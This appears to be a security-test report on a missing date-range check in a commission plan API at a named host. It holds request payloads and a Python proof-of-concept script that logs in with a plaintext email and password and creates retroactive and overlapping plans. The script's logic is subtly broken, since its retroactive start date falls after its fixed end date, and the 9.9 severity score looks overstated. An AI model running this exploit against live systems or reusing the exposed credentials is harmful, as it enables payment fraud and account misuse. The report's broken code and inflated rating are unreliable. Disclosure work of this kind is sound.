# Business Logic Flaw: Commission Plan Date Range Manipulation Enables Financial Timeline Control

**ID:** vuln-0042
**Severity:** CRITICAL
**Found:** 2026-02-26 19:31:26 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 9.9

## Description

A critical business logic vulnerability was discovered in the commission plan date range validation that allows attackers to manipulate financial timelines through sophisticated date range manipulation techniques.

The vulnerability exists in the `/api/CommissionPlan/CreateCommissionPlan` endpoint, which fails to properly validate date ranges for commission plans. This enables attackers to create commission plans with retroactive start dates, future end dates, or overlapping date ranges that violate business rules.

An attacker with Organization-level access can:
1. Create commission plans with retroactive start dates
2. Set excessively long or future-dated end dates
3. Create overlapping commission plans for the same time periods
4. Manipulate financial reporting timelines

## Impact

Successful exploitation of this vulnerability allows attackers to:

1. **Financial Fraud**: Apply commission plans retroactively to manipulate past payouts
2. **Double Payments**: Create overlapping commission plans that may result in double payments
3. **Financial Timeline Manipulation**: Control financial reporting periods and commission calculations
4. **Regulatory Compliance Violations**: Violate financial reporting regulations through timeline manipulation
5. **Business Process Disruption**: Disrupt normal financial operations and reporting

The financial impact could be severe, potentially resulting in:
- Unauthorized retroactive commission payments
- Double payments for the same sales periods
- Manipulated financial reporting
- Regulatory compliance violations
- Significant monetary losses through timeline manipulation

## Technical Analysis

The vulnerability exists due to insufficient date range validation in the commission plan creation process:

1. **Missing Retroactive Validation**: No validation to prevent retroactive start dates
2. **Missing Future Date Validation**: No validation to limit future end dates
3. **Missing Overlap Validation**: No validation to prevent overlapping commission plans
4. **Missing Business Rule Validation**: No enforcement of business rules for commission plan timelines

The `/api/CommissionPlan/CreateCommissionPlan` endpoint accepts JSON payloads with `startDate` and `endDate` parameters that are directly processed without proper validation against business rules or existing commission plans.

## Proof of Concept

**Reproduction Steps:**

1. Authenticate as an Organization user (nlnarayana3858@gmail.com / User@1234)
2. Capture the authentication token from the `/api/authenticate` response
3. Send a POST request to `/api/CommissionPlan/CreateCommissionPlan` with manipulated date ranges:

**Retroactive Commission Plan:**
```json
{
  "planName": "Retroactive Exploit Plan",
  "planDescription": "Plan with retroactive start date",
  "commissionPercentage": 10,
  "isActive": true,
  "startDate": "2023-01-01",  // Retroactive start date
  "endDate": "2024-12-31",
  "orgId": "current_org_id",
  "clientId": null
}
```

**Overlapping Commission Plan:**
```json
{
  "planName": "Overlapping Exploit Plan",
  "planDescription": "Plan overlapping existing period",
  "commissionPercentage": 15,
  "isActive": true,
  "startDate": "2024-06-01",  // Overlaps with existing plan
  "endDate": "2024-12-31",
  "orgId": "current_org_id",
  "clientId": null
}
```

4. Observe that the commission plans are created with the manipulated date ranges
5. Verify by calling `/api/commission-plan/get-all` that the plans show with the manipulated dates

```
import requests
import json
from datetime import datetime, timedelta

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
AUTH_ENDPOINT = f"{BASE_URL}/api/authenticate"
COMMISSION_PLAN_ENDPOINT = f"{BASE_URL}/api/CommissionPlan/CreateCommissionPlan"
COMMISSION_PLAN_LIST_ENDPOINT = f"{BASE_URL}/api/commission-plan/get-all"

# Organization user credentials
CREDENTIALS = {
    "username": "nlnarayana3858@gmail.com",
    "password": "User@1234"
}

# Step 1: Authenticate and get JWT token
auth_response = requests.post(AUTH_ENDPOINT, json=CREDENTIALS)
auth_data = auth_response.json()
jwt_token = auth_data['id_token']

headers = {
    "Authorization": f"Bearer {jwt_token}",
    "Content-Type": "application/json"
}

# Step 2: Create commission plan with retroactive start date
def create_retroactive_plan():
    retroactive_date = (datetime.now() - timedelta(days=365)).strftime("%Y-%m-%d")

    retroactive_plan = {
        "planName": "Exploit - Retroactive Plan",
        "planDescription": "Commission plan with retroactive start date",
        "commissionPercentage": 10,
        "isActive": True,
        "startDate": retroactive_date,  # Retroactive start date
        "endDate": "2024-12-31",
        "orgId": "current_org_id",  # Would be replaced with actual org ID
        "clientId": None
    }

    response = requests.post(COMMISSION_PLAN_ENDPOINT, headers=headers, json=retroactive_plan)

    if response.status_code == 200:
        print("SUCCESS: Created commission plan with retroactive start date")
        print(f"Plan ID: {response.json().get('id')}")
        print(f"Start Date: {retroactive_date}")
        return True
    else:
        print(f"FAILED: {response.status_code} - {response.text}")
        return False

# Step 3: Create commission plan with overlapping dates
def create_overlapping_plan():
    # Get existing plans to find overlapping periods
    list_response = requests.get(COMMISSION_PLAN_LIST_ENDPOINT, headers=headers)

    if list_response.status_code == 200:
        existing_plans = list_response.json()
        if existing_plans:
            # Use dates from first existing plan to create overlap
            existing_plan = existing_plans[0]
            start_date = existing_plan.get('startDate', '2024-01-01')
            end_date = existing_plan.get('endDate', '2024-12-31')

            overlapping_plan = {
                "planName": "Exploit - Overlapping Plan",
                "planDescription": "Commission plan overlapping existing period",
                "commissionPercentage": 15,
                "isActive": True,
                "startDate": start_date,  # Same start date as existing plan
                "endDate": end_date,      # Same end date as existing plan
                "orgId": "current_org_id",
                "clientId": None
            }

            response = requests.post(COMMISSION_PLAN_ENDPOINT, headers=headers, json=overlapping_plan)

            if response.status_code == 200:
                print("\nSUCCESS: Created commission plan with overlapping dates")
                print(f"Plan ID: {response.json().get('id')}")
                print(f"Dates: {start_date} to {end_date}")
                print("This could result in double commission payments")
                return True
            else:
                print(f"\nOverlapping plan failed: {response.status_code} - {response.text}")
                return False
        else:
            print("No existing plans found to overlap with")
            return False
    else:
        print(f"Failed to get existing plans: {list_response.status_code} - {list_response.text}")
        return False

if __name__ == "__main__":
    print("Testing Commission Plan Date Range Manipulation Vulnerabilities")
    print("=" * 60)

    # Test retroactive plan creation
    retro_success = create_retroactive_plan()

    # Test overlapping plan creation
    overlap_success = create_overlapping_plan()

    if retro_success or overlap_success:
        print("\nCRITICAL IMPACT: Successfully demonstrated date range manipulation vulnerabilities")
        print("This enables financial timeline control and potential double payments")
    else:
        print("\nNo date range manipulation vulnerabilities confirmed")
```

## Remediation

**Immediate Remediation Steps:**

1. **Implement Date Range Validation**:
   - Add validation to prevent retroactive start dates
   - Implement maximum duration limits for commission plans
   - Add validation to prevent future end dates beyond business rules

2. **Implement Overlap Validation**:
   - Add validation to prevent overlapping commission plans
   - Check for existing plans in the same date range
   - Implement business rules for plan spacing

3. **Enforce Business Rules**:
   - Implement validation for minimum and maximum plan durations
   - Add validation for allowed date ranges based on business rules
   - Implement proper state management for commission plans

4. **Audit and Monitoring**:
   - Implement logging for all commission plan creation and modification events
   - Set up alerts for suspicious date range manipulations
   - Regularly audit commission plans for unauthorized date ranges

**Long-Term Recommendations:**

1. Implement a comprehensive commission management workflow with date range validation
2. Add role-based access control for commission plan management
3. Implement change tracking for all commission plan modifications
4. Conduct regular security testing of commission-related functionality
5. Implement financial controls to detect and prevent timeline manipulation
6. Add comprehensive logging and alerting for commission processing
7. Implement integration with financial reporting systems for proper timeline validation

